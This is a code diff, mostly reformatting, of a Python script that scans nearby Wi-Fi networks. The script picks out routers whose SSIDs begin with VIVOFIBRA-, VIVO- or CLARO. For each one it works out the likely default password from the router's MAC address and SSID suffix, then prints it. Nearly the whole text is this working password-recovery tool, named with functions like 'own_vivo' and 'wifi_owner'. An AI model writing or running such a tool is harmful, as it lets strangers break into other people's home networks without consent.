@@ -3,10 +3,10 @@ import socket
 import wifi
 
 
-def get_wifi_info(interface):
+def get_wifi_info(interface) -> list:
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sockfd = sock.fileno()
+        # sockfd = sock.fileno()
         iw_cells = wifi.Cell.all(interface)
         wifi_info = [(cell.ssid, cell.address) for cell in iw_cells]
         return wifi_info
@@ -17,20 +17,21 @@ def get_wifi_info(interface):
 
 
 def is_vuln(ssid: str) -> bool:
-	if 'VIVOFIBRA-' in ssid or 'CLARO' in ssid or 'VIVO-' in ssid:
-		return True
+    if 'VIVOFIBRA-' in ssid or 'CLARO' in ssid or 'VIVO-' in ssid:
+        return True
+    return False
 
 
 def own_vivofibra(ssid: str,mac:str) -> str:
-	return mac.replace(":","").lower()[2:8] + ssid.split("-")[1].lower()
+    return mac.replace(":","").lower()[2:8] + ssid.split("-")[1].lower()
 
 
 def own_vivo(mac: str) -> str:
-	return mac.replace(":","").upper()[2:]
+    return mac.replace(":","").upper()[2:]
 
 
 def own_claro(mac: str) -> str:
-	return mac.replace(":","").upper()[4:]
+    return mac.replace(":","").upper()[4:]
 
 
 def wifi_owner(wifi_list: list):
@@ -39,11 +40,11 @@ def wifi_owner(wifi_list: list):
         for ssid, mac_address in wifi_list:
             if is_vuln(ssid):
                 if 'VIVOFIBRA-' in ssid:
-                    print(f"  Password: {own_vivofibra(ssid=ssid, mac=mac_address)} \t SSID: {ssid}")
+                    print(f"  Password: {own_vivofibra(ssid=ssid, mac=mac_address)}\tSSID: {ssid}")
                 if 'VIVO-' in ssid:
-                    print(f"  Password: {own_vivo(mac=mac_address)} \t SSID: {ssid}")
+                    print(f"  Password: {own_vivo(mac=mac_address)}\tSSID: {ssid}")
                 if 'CLARO-' in ssid:
-                    print(f"  Password: {own_claro(mac=mac_address)} \t SSID: {ssid}")
+                    print(f"  Password: {own_claro(mac=mac_address)}\tSSID: {ssid}")
 
 
 if __name__ == "__main__":
